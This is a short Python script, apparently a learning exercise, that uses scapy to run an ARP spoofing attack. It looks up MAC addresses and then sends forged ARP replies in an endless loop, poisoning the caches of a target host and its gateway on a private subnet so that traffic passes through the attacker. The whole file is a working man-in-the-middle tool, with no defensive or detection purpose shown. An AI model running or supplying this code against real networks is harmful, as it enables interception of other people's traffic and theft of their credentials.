import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # we want only the first element (since we are not asking for a ip range, but for a single ip)
    # and the data we want will be at the index 1 of the found element
    # the mac will be at the hwsrc key
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


sent_packets_count = 0
while True:
    spoof("172.16.239.139", "172.16.239.2")
    spoof("172.16.239.2", "172.16.239.139")
    sent_packets_count+=2
    print("\r[+] Packets sent: {count}".format(count=sent_packets_count), end="")
    time.sleep(2)